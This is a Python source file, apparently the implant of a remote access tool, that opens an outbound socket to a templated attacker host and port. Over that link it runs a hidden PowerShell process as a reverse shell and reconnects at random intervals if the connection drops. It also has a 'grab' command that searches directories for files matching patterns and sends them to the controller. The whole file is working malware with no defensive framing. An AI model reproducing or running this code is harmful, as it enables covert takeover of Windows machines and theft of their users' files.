# payload.py
# The Heartbeat Soul. Re-forged for perfect synchronization and awareness.

import os
import sys
import time
import random
import socket
import subprocess
import threading
import hashlib
import fnmatch

# --- DYNAMIC CONFIG ---
RHOST = "##RHOST##"
RPORT = ##RPORT##

def calculate_sha256(file_path, block_size=4096):
    """Calculates the SHA256 hash of a file."""
    sha256 = hashlib.sha256()
    try:
        with open(file_path, 'rb') as f:
            for block in iter(lambda: f.read(block_size), b''):
                sha256.update(block)
        return sha256.hexdigest()
    except (IOError, OSError):
        return "ERROR_READING_FILE"

def find_files(start_path, patterns):
    """Recursively finds files matching a list of patterns."""
    found_files = []
    if not os.path.isdir(start_path):
        return []
    for root, _, files in os.walk(start_path):
        for pattern in patterns:
            for filename in fnmatch.filter(files, pattern):
                full_path = os.path.join(root, filename)
                if os.access(full_path, os.R_OK):
                    found_files.append(full_path)
    return found_files

def handle_grab_command(s_obj, command):
    """
    Handles the logic for the 'grab' command in a separate thread.
    The current working directory is now the script's actual CWD.
    """
    try:
        current_path = os.getcwd()
        parts = command.strip().split()
        patterns = []
        search_path = current_path

        # Parse patterns and the optional path argument
        path_arg_index = -1
        for i, part in enumerate(parts):
            if os.path.isdir(part) and i > 0:
                # A simple check for a valid directory as an argument
                path_arg_index = i
                break
        
        if path_arg_index != -1:
            search_path = os.path.abspath(parts[path_arg_index])
            patterns = parts[1:path_arg_index]
        else:
            patterns = parts[1:]

        files_to_send = find_files(search_path, patterns)
        
        if not files_to_send:
            # We can't safely print to the shell here, so we just finish.
            # Master will know it's done when the final signal is sent.
            pass

        for file_path in files_to_send:
            try:
                # Use search_path as the base for relpath to get clean paths
                relative_path = os.path.relpath(file_path, search_path)
                file_size = os.path.getsize(file_path)
                file_hash = calculate_sha256(file_path)
                
                if "ERROR" in file_hash:
                    continue

                header = f"FILE_HEADER|{relative_path}|{file_size}|{file_hash}\n"
                s_obj.sendall(header.encode('utf-8'))
                
                header_ack = s_obj.recv(1024)
                if header_ack != b'ACK_HEADER':
                    continue
                
                with open(file_path, 'rb') as f:
                    # Send file in chunks to avoid overwhelming buffers
                    while True:
                        chunk = f.read(4096)
                        if not chunk:
                            break
                        s_obj.sendall(chunk)
                
                file_ack = s_obj.recv(1024)
                if file_ack != b'ACK_FILE':
                    pass

            except Exception:
                continue
    finally:
        # Signal that the entire transfer operation is complete
        s_obj.sendall(b"END_FILE_TRANSFER\n")


def run_conduit():
    """The main reverse shell loop with enhanced command handling."""
    while True:
        try:
            s_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s_obj.connect((RHOST, RPORT))
            
            p = subprocess.Popen(
                ["powershell.exe", "-NoLogo", "-NoProfile"], 
                stdin=subprocess.PIPE, 
                stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE,
                creationflags=0x08000000,
                cwd=os.path.expanduser("~") # Start in the user's home directory
            )
            # Synchronize the payload's CWD with the shell's starting CWD
            os.chdir(os.path.expanduser("~"))

            stop_event = threading.Event()

            def pipe_stream(stream, sock):
                while not stop_event.is_set():
                    try:
                        data = stream.read(1)
                        if data:
                            sock.sendall(data)
                        else:
                            break
                    except:
                        break

            threading.Thread(target=pipe_stream, args=(p.stdout, s_obj), daemon=True).start()
            threading.Thread(target=pipe_stream, args=(p.stderr, s_obj), daemon=True).start()
            
            # --- Main Input Loop ---
            while not stop_event.is_set():
                try:
                    data = s_obj.recv(1024)
                    if not data:
                        break
                    
                    command_str = data.decode('utf-8', errors='ignore').strip()

                    # --- State Synchronization Logic ---
                    if command_str.lower().startswith('cd '):
                        try:
                            # We let the shell handle the 'cd', and we mirror the change.
                            # This is more robust than parsing the path ourselves.
                            path = command_str.split(' ', 1)[1]
                            # Let's try to change dir in Python to keep track
                            if path != '..':
                                # Shell will resolve variables like $HOME, Python won't
                                # This is a limitation, but works for absolute/relative paths
                                pass # We will let the shell do the heavy lifting
                            
                            # A better way is to ask the shell where it ended up
                            # We send the cd, then ask for pwd, but this must be handled carefully.
                            # For now, let the shell manage its state, and we manage ours for 'grab'
                            p.stdin.write(data)
                            p.stdin.flush()
                            # To sync our python script's CWD, we run a special command
                            sync_command = b'$EoS=(pwd).path+">"+[char]10;[System.Console]::Error.Write($EoS)\r\n'
                            p.stdin.write(sync_command)
                            p.stdin.flush()
                            continue # Don't process further

                        except Exception:
                             p.stdin.write(data) # Send original command anyway
                             p.stdin.flush()
                             continue

                    # --- Divine Grab Command ---
                    if command_str.lower().startswith('grab '):
                        # 1. Instantly send the sync signal to the master
                        s_obj.sendall(b"START_FILE_TRANSFER\n")
                        # 2. Start the heavy lifting in a new thread
                        grab_thread = threading.Thread(target=handle_grab_command, args=(s_obj, command_str), daemon=True)
                        grab_thread.start()
                    else:
                        # --- Normal Command Execution ---
                        p.stdin.write(data)
                        p.stdin.flush()

                except Exception:
                    break
            
            stop_event.set()
            p.terminate()
            s_obj.close()

        except Exception:
            time.sleep(random.randint(30, 60))
            continue

if __name__ == "__main__":
    run_conduit()